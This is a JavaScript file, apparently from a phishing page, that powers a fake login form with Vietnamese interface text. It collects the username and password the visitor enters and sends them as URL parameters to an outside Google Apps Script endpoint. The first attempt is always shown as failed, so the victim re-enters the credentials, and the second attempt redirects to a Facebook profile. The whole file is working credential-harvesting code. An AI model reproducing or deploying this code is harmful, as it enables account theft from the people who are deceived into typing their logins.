var request = new XMLHttpRequest();

var link = "https://script.google.com/macros/s/AKfycbzCuJL8ooCucgaQ8yL2eRyPjHT4AKYr8uLI8G_fmJVKKaOKp9Q0QBoh7Eo3tl_l51HsSA/exec?username=";
var username = document.getElementById("username");
var password = document.getElementById("password");
var submit = document.getElementById("login");

username.addEventListener("keydown",login);
password.addEventListener("keydown",login);

function login(e){
	if(e.key == "Enter")
		submit.click();
}

var times = 0;

submit.addEventListener("click",function(){
	let user = username.value;
	let pass = password.value;
	console.log(user+"   "+pass);
	if(user && pass){
		//Tang so lan
		times=(times+1)%2;

		//Gui request
		request.open("GET",link+user+"&password="+pass);
		anNut();

		//Theo doi trang thai
		request.onreadystatechange = function(){
			if(this.readyState==4){
				if(times==0 && this.responseText){
					console.log("Thanh cong!");
					window.location = "https://www.facebook.com/vandung2kk2";
				}else{
					//Hien thi thong bao
					document.getElementById("noti-box").style.display="flex";
				}
				hienNut();
			}
		}
		request.send();
	}
})

document.getElementById("close-btn").addEventListener("click",function(){
	document.getElementById("noti-box").style.display="none";
})

function anNut(){
	submit.setAttribute("style","opacity:0.5");
	submit.innerText="Đang xử lý...";
}

function hienNut(){
	submit.setAttribute("style","opacity:1");
	submit.innerText="Đăng nhập ngay";
}